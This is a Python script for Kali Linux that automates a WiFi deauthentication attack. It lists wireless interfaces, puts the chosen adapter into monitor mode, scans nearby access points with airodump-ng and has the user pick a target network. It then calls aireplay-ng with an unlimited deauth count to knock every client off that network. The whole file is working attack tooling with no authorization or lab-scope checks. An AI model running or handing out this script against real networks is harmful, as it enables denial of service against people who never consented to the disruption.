# this is running on kali linux

# subprocess module for running commands on kali
import subprocess

import re
import csv
import os
import time
from datetime import datetime

import shutil

active_wifi_networks = []

# checks if the ESSID is already in the list 
# if it is in the list then check_for_essid() returns False, 
# if it isn't then it returns True and adds the ESSID to the list
def check_for_essid(essid, list):
    check_status = True
    
    if len(list) == 0:
        return check_status
    
    for item in list:
        
        if essid in item["ESSID"]:
            check_status = False
            
    return check_status


# sudo mode is required to run this script
if not 'SUDO_UID' in os.environ.keys():
    print("Sudo mode is required. Try again.")
    exit()
    


# removes csv files before the script runs
for file_name in os.listdir():
    
    if ".csv" in file_name:
        
        print("Found .csv files in your directory. Moving them to backup")
        
        directory = os.getcwd()
        
        try:
            os.mkdir(directory + "/backup/")
            
        except:
            print("backup folder already exists")
        
        timestamp = datetime.now()
        
        shutil.move(file_name, directory + "/backup/" + str(timestamp) + "-" + file_name)


# regex to find the wireless interfaces, if they're all wlan0 or higher
wlan_pattern = re.compile("^wlan[0-9]+")


# this uses the subprocess module to run system commands
# iwconfig command looks for wireless interfaces
check_wifi_result = wlan_pattern.findall(subprocess.run(["iwconfig"], capture_output=True).stdout.decode())


# no wifi adapter connected
if len(check_wifi_result) == 0:
    print("Connect a wifi adapter and try again")
    exit()
    
    
# menu to select wifi
print("The following WiFi interfaces are available:")
for index, item in enumerate(check_wifi_result):
    print(f"{index} - {item}")


# check if the selected wifi is valid
while True:
    wifi_interface_choice = input("Please select the interface you want to use for the attack: ")
    try:
        if check_wifi_result[int(wifi_interface_choice)]:
            break
    except:
        print("Enter the number of one of the choices")

# user's selected wifi
user_choice = check_wifi_result[int(wifi_interface_choice)]


# have to kill any conflicting processes
print("The wifi adapter is connected, now ending conflicting processes:")

kill_conflict_processes = subprocess.run(["sudo", "airmon-ng", "check", "kill"])

# put in monitor mode
print("putting wifi adapter in monitor mode:")
put_in_monitor_mode = subprocess.run(["sudo", "airmon-ng", "start", user_choice])


# .Popen() runs a command and the output is a file that can be accessed by other programs

discover_access_points = subprocess.Popen(["sudo", "airodump-ng","-w" ,"file","--write-interval", "1","--output-format", "csv", user_choice + "mon"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)


# this loop shows the wireless access points. uses a try-except block and you quit the loop by pressing CTRL-C
try:
    while True:
        # clears the screen first
        subprocess.call("clear", shell=True)
        for file_name in os.listdir():
                # should only have one csv file. all previous csv files from the folder are backed-up every time this runs
                
                # this list contains the field names for the csv entries
                fieldnames = ['BSSID', 'First_time_seen', 'Last_time_seen', 'channel', 'Speed', 'Privacy', 'Cipher', 'Authentication', 'Power', 'beacons', 'IV', 'LAN_IP', 'ID_length', 'ESSID', 'Key']
                
                if ".csv" in file_name:
                    with open(file_name) as csv_h:
                        # this will run multiple times and the cursor needs to reset to the beginning
                        csv_h.seek(0)
                        
                        # take the csv_h contents and apply the dictionary with the fieldnames from above 
                        # This creates a list of dictionaries with the keys from the fieldnames
                        csv_reader = csv.DictReader(csv_h, fieldnames=fieldnames)
                        for row in csv_reader:
                            
                            # We want to exclude the row with BSSID.
                            if row["BSSID"] == "BSSID":
                                pass
                            
                            # don't care about the client data
                            elif row["BSSID"] == "Station MAC":
                                break
                            
                            # every field where there's an ESSID will be added to the list.
                            elif check_for_essid(row["ESSID"], active_wifi_networks):
                                active_wifi_networks.append(row)



        print("Scanning... Press Ctrl+C to select which wifi network you want to attack.\n")
        print("No |\tBSSID              |\tChannel|\tESSID                         |")
        print("___|\t___________________|\t_______|\t______________________________|")
        
        for index, item in enumerate(active_wifi_networks):

            print(f"{index}\t{item['BSSID']}\t{item['channel'].strip()}\t\t{item['ESSID']}")
            
        # the script sleeps for 1 second before loading the updated list
        time.sleep(1)

except KeyboardInterrupt:
    print("\nReady to make choice:")

#check that the input choice is valid
while True:
    # If you don't make a choice from the options in the list, 
    # you're asked to try again.
    choice = input("Please select a choice from above: ")
    try:
        if active_wifi_networks[int(choice)]:
            break
    except:
        print("Please try again.")

# assign the results to variables.
hackbssid = active_wifi_networks[int(choice)]["BSSID"]
hackchannel = active_wifi_networks[int(choice)]["channel"].strip()

# Change to the channel we're going to run the DOS attack on 
# the monitoring takes place on a different channel. set it to that channel. 
subprocess.run(["airmon-ng", "start", user_choice + "mon", hackchannel])

# deauthenticates clients using a subprocess.
# This script is the parent process and it creates a child process which runs the system command, 
# and will only continue once the child process has completed

subprocess.run(["aireplay-ng", "--deauth", "0", "-a", hackbssid, check_wifi_result[int(wifi_interface_choice)] + "mon"])


# press CTRL-C to exit the script